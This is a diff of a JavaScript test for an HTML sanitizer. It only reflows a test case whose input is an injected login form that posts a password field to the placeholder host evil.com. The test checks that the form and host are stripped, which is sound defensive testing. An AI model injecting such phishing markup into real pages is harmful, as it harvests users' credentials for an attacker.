@@ -123,7 +123,8 @@ describe('sanitizeHTML — advanced payloads', () => {
   });
 
   it('strips form tags (phishing via injected forms)', () => {
-    const input = '<form action="https://evil.com/steal"><input name="password"><button>Login</button></form>';
+    const input =
+      '<form action="https://evil.com/steal"><input name="password"><button>Login</button></form>';
     const result = sanitizeHTML(input);
     expect(result).not.toContain('<form');
     expect(result).not.toContain('evil.com');
